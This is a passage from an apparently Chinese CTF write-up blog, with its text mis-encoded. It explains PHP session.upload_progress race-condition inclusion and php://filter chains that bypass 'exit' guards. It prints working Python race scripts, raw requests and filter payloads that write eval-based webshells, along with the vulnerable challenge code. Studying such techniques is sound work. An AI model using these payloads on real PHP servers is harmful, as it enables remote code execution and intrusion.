class="built_in">print</span> e</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    brute_force_tmp_files()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="æ–¹æ³•äºŒ-åˆ©ç”¨-session-upload-progress-è¿›è¡Œ-session-æ–‡ä»¶åŒ…å«"><a href="#æ–¹æ³•äºŒ-åˆ©ç”¨-session-upload-progress-è¿›è¡Œ-session-æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–¹æ³•äºŒ åˆ©ç”¨ session.upload_progress è¿›è¡Œ session æ–‡ä»¶åŒ…å«"></a>æ–¹æ³•äºŒ åˆ©ç”¨ session.upload_progress è¿›è¡Œ session æ–‡ä»¶åŒ…å«</h4><p>åŸç†ï¼šåˆ©ç”¨session.upload_progressä¸Šä¼ ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶é‡Œé¢æœ‰æˆ‘ä»¬ä¸Šä¼ çš„æ¶æ„ä»£ç ï¼Œç„¶ååŒ…å«å®ƒï¼Œä»è€Œæ‰§è¡Œé‡Œé¢çš„ä»£ç ã€‚å› ä¸ºè¯¥æ–‡ä»¶å†…å®¹æ¸…ç©ºå¾ˆå¿«ï¼Œæ‰€ä»¥éœ€è¦ä¸åœçš„ä¸Šä¼ å’ŒåŒ…å«ï¼Œåœ¨æ¸…ç©ºä¹‹å‰åŒ…å«è¯¥æ–‡ä»¶ã€‚</p><p>sessionä¸­ä¸€éƒ¨åˆ†æ•°æ®(session.upload_progress.name)æ˜¯ç”¨æˆ·è‡ªå·±å¯ä»¥æ§åˆ¶çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬åªè¦ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™ï¼Œåœ¨Cookieä¸­è®¾ç½®PHPSESSID&#x3D;yym68686ï¼ˆé»˜è®¤æƒ…å†µä¸‹session.use_strict_mode&#x3D;0ç”¨æˆ·å¯ä»¥è‡ªå®šä¹‰Session IDï¼‰ï¼ŒåŒæ—¶POSTä¸€ä¸ªæ¶æ„çš„å­—æ®µPHP_SESSION_UPLOAD_PROGRESS ï¼Œï¼ˆPHP_SESSION_UPLOAD_PROGRESSåœ¨session.upload_progress.nameä¸­å®šä¹‰ï¼‰ï¼Œåªè¦ä¸Šä¼ åŒ…é‡Œå¸¦ä¸Šè¿™ä¸ªé”®ï¼ŒPHPå°±ä¼šè‡ªåŠ¨å¯ç”¨Sessionï¼ŒåŒæ—¶ï¼Œæˆ‘ä»¬åœ¨Cookieä¸­è®¾ç½®äº†PHPSESSID&#x3D;yym68686ï¼Œæ‰€ä»¥Sessionæ–‡ä»¶å°†ä¼šè‡ªåŠ¨åˆ›å»ºã€‚</p><p>å› ä¸ºsession.upload_progress.cleanup &#x3D; onè¿™ä¸ªé»˜è®¤é€‰é¡¹ä¼šæœ‰é™åˆ¶ï¼Œå½“æ–‡ä»¶ä¸Šä¼ ç»“æŸåï¼Œphpå°†ä¼šç«‹å³æ¸…ç©ºå¯¹åº”sessionæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œè¿™å°±å¯¼è‡´æˆ‘ä»¬åœ¨åŒ…å«è¯¥sessionçš„æ—¶å€™ç›¸å½“äºåœ¨åŒ…å«ä¸€ä¸ªç©ºæ–‡ä»¶ï¼Œæ²¡æœ‰åŒ…å«æˆ‘ä»¬ä¼ å…¥çš„æ¶æ„ä»£ç ã€‚ä¸è¿‡ï¼Œæˆ‘ä»¬åªéœ€è¦æ¡ä»¶ç«äº‰ï¼Œèµ¶åœ¨æ–‡ä»¶è¢«æ¸…é™¤å‰åˆ©ç”¨å³å¯ã€‚</p><p>ç¼–å†™è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;http://003ae9af-2700-4283-99e8-da47b33de836.node4.buuoj.cn:81/flflflflag.php&#x27;</span></span><br><span class="line">sessid = <span class="string">&#x27;feng&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            host,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php phpinfo();fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;a.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">READ</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(<span class="string">f&#x27;<span class="subst">&#123;host&#125;</span>?file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line">    READ(session) </span><br></pre></td></tr></table></figure><p>å½“è¿è¡Œåœæ­¢åï¼Œå‘é€è¯·æ±‚ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /flflflflag.php?file=shell.php HTTP/1.1</span><br><span class="line">Host: b75582fa-5dab-4f76-8734-1c591cb88d31.node4.buuoj.cn:81</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 14</span><br><span class="line"></span><br><span class="line">cmd=phpinfo(); </span><br></pre></td></tr></table></figure><p>åœ¨å“åº”é‡Œå¾—åˆ°flagï¼Œè—åœ¨phpinfo()é‡Œã€‚</p><p>æˆ–è€…è¿è¡Œå®Œä¸‹é¢è¿™ä¸ªè„šæœ¬åå°±å¯ä»¥ç›´æ¥è·å¾—flagï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;http://003ae9af-2700-4283-99e8-da47b33de836.node4.buuoj.cn:81/flflflflag.php&#x27;</span></span><br><span class="line">sessid = <span class="string">&#x27;yym68686&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            host,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;a.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">READ</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(<span class="string">f&#x27;<span class="subst">&#123;host&#125;</span>?file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\rWaiting...&#x27;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\r&quot;</span> + re.search(<span class="string">r&#x27;flag&#123;(.*?)&#125;&#x27;</span>, response.text).group(<span class="number">0</span>))</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line">    READ(session) </span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè„šæœ¬çš„å‰ææ˜¯å¿…é¡»çŸ¥é“flagåœ¨phpinfoé‡Œé¢ï¼Œæ‰€ä»¥å±€é™æ€§æ¯”è¾ƒå¤§ã€‚æŠŠ<?php phpinfo();?>æ¢æˆ<?php system('cat \*');?>ä¹Ÿå¯ä»¥ï¼Œè¾“å‡ºçš„ä¾ç„¶æ˜¯phpinfo()çš„å†…å®¹ã€‚</p><hr><h3 id="æŠ¤ç½‘æ¯easyphp"><a href="#æŠ¤ç½‘æ¯easyphp" class="headerlink" title="æŠ¤ç½‘æ¯easyphp"></a><a href="#%E6%8A%A4%E7%BD%91%E6%9D%AFeasyphp" title="æŠ¤ç½‘æ¯easyphp"></a>æŠ¤ç½‘æ¯easyphp</h3><p>æŠ¤ç½‘æ¯é‡åˆ°äº†ä¸€é¢˜easyphpï¼Œé‡åˆ°äº†å…³äºfilteråè®®è¯»å†™æ–‡ä»¶çš„å†…å®¹ã€‚å½“æ—¶æ²¡æœ‰åšå‡ºæ¥ï¼Œå¤ç°ä¹Ÿæ²¡æœ‰ç»™Dockerï¼Œè‡ªå·±æ‰“ä¸€ä¸ªç¯å¢ƒã€‚é¢˜ç›®å…·ä½“å¦‚ä½•å¾—åˆ°æºç çš„è¿‡ç¨‹å°±ä¸è¯´äº†ï¼Œè¿™é‡Œæ˜¯å…³é”®æ–‡ä»¶çš„ä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$sandbox</span> = <span class="string">&#x27;/var/www/html/sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Here is your sandbox: &quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">@<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64|%|toupper|tolower|dechunk|\.\./i&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$content</span>)) &#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$content</span>, <span class="string">&#x27;&lt;?php exit();&#x27;</span> . <span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„å…³é”®æ˜¯åˆ©ç”¨php:&#x2F;&#x2F;filterä¼ªåè®®è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯å…¶ä¸­æœ‰æ­»äº¡exitï¼Œä»¥åŠä¼—å¤šfilteråè®®çš„å­—ç¬¦ä¸²è¿‡æ»¤å™¨WAFã€‚</p><p>è¿™é‡Œæ²¡æœ‰è¿‡æ»¤<code>zlib.inflate</code>ï¼Œæ¤å…¥phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=string.strip_tags|zlib.inflate|?&gt;&lt;?php eval($_GET[a]);?&gt;&lt;?/resource=shell.php</span></span><br></pre></td></tr></table></figure><p>åœ¨shellå†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œå†åŒ…å«æ–‡ä»¶å°±shelläº†ã€‚</p><p>çœ‹åˆ°è¿™å¥è¯è¿˜æ˜¯å¯ä»¥ç†è§£çš„ï¼Œå°±æ˜¯æœ‰äº›åœ°æ–¹å°±æƒ³ä¸é€šã€‚ä¸ºä»€ä¹ˆè¿˜è¦<code>?&gt;</code>å’Œ<code>&lt;?</code>ï¼Ÿä¸ºä»€ä¹ˆè¿™æ ·å¯ä»¥ç»•è¿‡æ­»äº¡exitï¼Ÿå‹ç¼©åä¸ºä»€ä¹ˆè¿˜èƒ½æ‰§è¡Œï¼Ÿ</p><p>äºæ˜¯å°±èŒç”Ÿäº†å¥½å¥½å­¦å­¦phpä¼ªåè®®filterçš„æƒ³æ³•ï¼Œä»¥ä¸‹å°±æ˜¯è‡ªå·±çš„å­¦ä¹ è®°å½•äº†ã€‚</p><h4 id="çœ‹å‡ ä¸ªæ ·ä¾‹å§"><a href="#çœ‹å‡ ä¸ªæ ·ä¾‹å§" class="headerlink" title="çœ‹å‡ ä¸ªæ ·ä¾‹å§"></a>çœ‹å‡ ä¸ªæ ·ä¾‹å§</h4><p>è¿™é‡Œå€Ÿé‰´å®‰å…¨å®¢çš„ä¸€ç¯‡æ–‡ç« çš„æ ·ä¾‹ï¼Œé“¾æ¥åœ¨å‚è€ƒé“¾æ¥æ”¾å‡ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¿›è¡Œå‡ ä¸ªæ“ä½œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php:<span class="comment">//filter/resource=file.txt</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œå½“æ²¡æœ‰è§„å®šæ˜¯å¦æ˜¯writeæˆ–è€…readæ—¶ï¼Œphpä¼šè§†æƒ…å†µè¿›è¡Œè¯»æˆ–å†™æ–‡ä»¶ã€‚è¯¥æ•°æ®æµæ ‡è¯†1æ˜æ–‡è¯»å–file.txtæ–‡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=file.txt</span></span><br></pre></td></tr></table></figure><p>ç¼–ç åè¯»å–file.txtæ–‡ä»¶ã€‚ä¹ä¸€çœ‹æ˜¯ç›¸åŒçš„ï¼Œç¼–ç åçš„æ–‡ä»¶è¯»å–ç”šè‡³å¯èƒ½çœ‹èµ·æ¥æ›´åŠ éº»çƒ¦ä¸€äº›ã€‚ä½†æ˜¯åœ¨è¯»å–ä¾‹å¦‚PHPæ–‡ä»¶æ—¶ï¼Œæ²¡æœ‰ç»è¿‡ç¼–ç çš„æ–‡ä»¶å°†ä¼šè¢«å½“åšPHPæ–‡ä»¶æ‰§è¡Œï¼Œä»è€Œè¾¾ä¸åˆ°è¯»å–æ–‡ä»¶çš„ä½œç”¨ã€‚</p><h4 id="ä»€ä¹ˆæ˜¯æ­»äº¡exit"><a href="#ä»€ä¹ˆæ˜¯æ­»äº¡exit" class="headerlink" title="ä»€ä¹ˆæ˜¯æ­»äº¡exit"></a>ä»€ä¹ˆæ˜¯æ­»äº¡exit</h4><p>æ­»äº¡exitæŒ‡çš„æ˜¯åœ¨è¿›è¡Œå†™å…¥PHPæ–‡ä»¶æ“ä½œæ—¶ï¼Œæ‰§è¡Œäº†ä»¥ä¸‹å‡½æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$content</span>, <span class="string">&#x27;&lt;?php exit();&#x27;</span> . <span class="variable">$content</span>); </span><br></pre></td></tr></table></figure><p>äº¦æˆ–è€…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$content</span>, <span class="string">&#x27;&lt;?php exit();?&gt;&#x27;</span> . <span class="variable">$content</span>); </span><br></pre></td></tr></table></figure><p>è¿™æ ·ï¼Œå½“ä½ æ’å…¥ä¸€å¥è¯æœ¨é©¬æ—¶ï¼Œæ–‡ä»¶çš„å†…å®¹æ˜¯è¿™æ ·å­çš„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">exit</span>();<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;oatmeal&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>çœ‹å§ï¼è¿™æ ·å³ä½¿æ’å…¥äº†ä¸€å¥è¯æœ¨é©¬ï¼Œåœ¨è¢«ä½¿ç”¨çš„æ—¶å€™ä¹Ÿæ— æ³•è¢«æ‰§è¡Œã€‚è¿™æ ·çš„æ­»äº¡exité€šå¸¸å­˜åœ¨äºç¼“å­˜ã€é…ç½®æ–‡ä»¶ç­‰ç­‰ä¸å…è®¸ç”¨æˆ·ç›´æ¥è®¿é—®çš„æ–‡ä»¶å½“ä¸­ã€‚</p><h4 id="å¦‚ä½•è¿›è¡Œç»•è¿‡-base64decodeç»•è¿‡"><a href="#å¦‚ä½•è¿›è¡Œç»•è¿‡-base64decodeç»•è¿‡" class="headerlink" title="å¦‚ä½•è¿›è¡Œç»•è¿‡-base64decodeç»•è¿‡"></a>å¦‚ä½•è¿›è¡Œç»•è¿‡-base64decodeç»•è¿‡</h4><p>è¿™é‡Œå°±å¯ä»¥ç”¨åˆ°filteråè®®æ¥ç»•è¿‡äº†ï¼çœ‹ä¸‹è¿™æ ·çš„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure><p>å½“ç”¨æˆ·é€šè¿‡POSTæ–¹å¼æäº¤ä¸€ä¸ªæ•°æ®æ—¶ï¼Œä¼šä¸æ­»äº¡exitè¿›è¡Œæ‹¼æ¥ï¼Œä»è€Œé¿å…æäº¤çš„æ•°æ®è¢«æ‰§è¡Œã€‚</p><p>ç„¶è€Œè¿™é‡Œå¯ä»¥åˆ©ç”¨php:&#x2F;&#x2F;filterçš„base64-decodeæ–¹æ³•ï¼Œå°†<code>$content</code>è§£ç ï¼Œåˆ©ç”¨php base64_decodeå‡½æ•°ç‰¹æ€§å»é™¤æ­»äº¡exitã€‚</p><p>base64ç¼–ç ä¸­åªåŒ…å«64ä¸ªå¯æ‰“å°å­—ç¬¦ï¼Œå½“PHPé‡åˆ°ä¸å¯è§£ç çš„å­—ç¬¦æ—¶ï¼Œä¼šé€‰æ‹©æ€§çš„è·³è¿‡ï¼Œè¿™ä¸ªæ—¶å€™base64å°±ç›¸å½“äºä»¥ä¸‹çš„è¿‡ç¨‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œå½“<code>$content</code> åŒ…å« <code>&lt;?php exit; ?&gt;</code>æ—¶ï¼Œè§£ç è¿‡ç¨‹ä¼šå…ˆå»é™¤è¯†åˆ«ä¸äº†çš„å­—ç¬¦ï¼Œ<?;?>éƒ½å°†è¢«å»é™¤ï¼Œäºæ˜¯å‰©ä¸‹çš„å­—ç¬¦å°±åªæœ‰<code>phpexit</code>ä»¥åŠæˆ‘ä»¬ä¼ å…¥çš„å­—ç¬¦äº†ã€‚ç”±äºbase64æ˜¯4ä¸ªbyteä¸€ç»„ï¼Œå†æ·»åŠ ä¸€ä¸ªå­—ç¬¦ä¾‹å¦‚æ·»åŠ å­—ç¬¦â€™aâ€™åï¼Œå°†â€™phpexitaâ€™å½“åšä¸¤ç»„base64è¿›è¡Œè§£ç ï¼Œä¹Ÿå°±ç»•è¿‡è¿™ä¸ªæ­»äº¡exitäº†ã€‚</p><p>è¿™ä¸ªæ—¶å€™åé¢å†åŠ ä¸Šç¼–ç åçš„ä¸€å¥è¯æœ¨é©¬ï¼Œå°±å¯ä»¥getshelläº†ã€‚<br><img src="https://www.leavesongs.com/content/uploadfile/201607/fca81469385894.png"></p><h3 id="å¦‚ä½•è¿›è¡Œç»•è¿‡-strip-tagsç»•è¿‡"><a href="#å¦‚ä½•è¿›è¡Œç»•è¿‡-strip-tagsç»•è¿‡" class="headerlink" title="å¦‚ä½•è¿›è¡Œç»•è¿‡-strip_tagsç»•è¿‡"></a>å¦‚ä½•è¿›è¡Œç»•è¿‡-strip_tagsç»•è¿‡</h3><p>å°±æ˜¯å‰é¢å†™åˆ°çš„å¯ä»¥å»é™¤XMLæ ‡ç­¾çš„è¿‡æ»¤å™¨å•¦ã€‚</p><p>è¿™æ®µä»£ç ï¼š<code>&lt;?php exit; ?&gt;</code> å®é™…ä¸Šå°±æ˜¯XMLæ ‡ç­¾ï¼Œå¯ä»¥åˆ©ç”¨strip_tagsè¿›è¡Œå»é™¤ï¼Œä»è€Œè¿›è¡Œç»•è¿‡ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬è¦å†™å…¥çš„ä¸€å¥è¯æœ¨é©¬ä¹Ÿæ˜¯XMLæ ‡ç­¾ï¼Œåœ¨ç”¨åˆ°strip_tagsæ—¶ä¹Ÿä¼šè¢«å»é™¤ã€‚</p><p>æ³¨æ„åˆ°åœ¨å†™å…¥æ–‡ä»¶çš„æ—¶å€™ï¼Œfilteræ˜¯æ”¯æŒå¤šä¸ªè¿‡æ»¤å™¨çš„ã€‚å¯ä»¥å…ˆå°†webshellç»è¿‡base64ç¼–ç ï¼Œstrip_tagså»é™¤æ­»äº¡exitä¹‹åï¼Œå†é€šè¿‡base64-decodeå¤åŸã€‚</p><p><img src="https://www.leavesongs.com/content/uploadfile/201607/95b61469385895.png"></p><h4 id="å›åˆ°è¿™é¢˜easyphpåº·åº·å§"><a href="#å›åˆ°è¿™é¢˜easyphpåº·åº·å§" class="headerlink" title="å›åˆ°è¿™é¢˜easyphpåº·åº·å§"></a>å›åˆ°è¿™é¢˜easyphpåº·åº·å§</h4><p>å›åˆ°è¿™é“é¢˜ï¼Œå­˜åœ¨ä»¥ä¸‹è¿‡æ»¤ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64|%|toupper|tolower|dechunk|\.\./i&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>å¯ä»¥æ³¨æ„åˆ°ï¼Œè¿‡æ»¤äº†æå¤§éƒ¨åˆ†çš„å­—ç¬¦ä¸²è¿‡æ»¤å™¨å’Œè½¬æ¢è¿‡æ»¤å™¨ã€‚å¹¸è¿çš„æ˜¯æ²¡æœ‰è¿‡æ»¤å‹ç¼©è¿‡æ»¤å™¨ä»¥åŠstrip_tagsï¼Œå¯ä»¥ç»„åˆè¿›è¡Œç»•è¿‡ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œå°†æœ¨é©¬å†™å…¥shell.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=&lt;?php 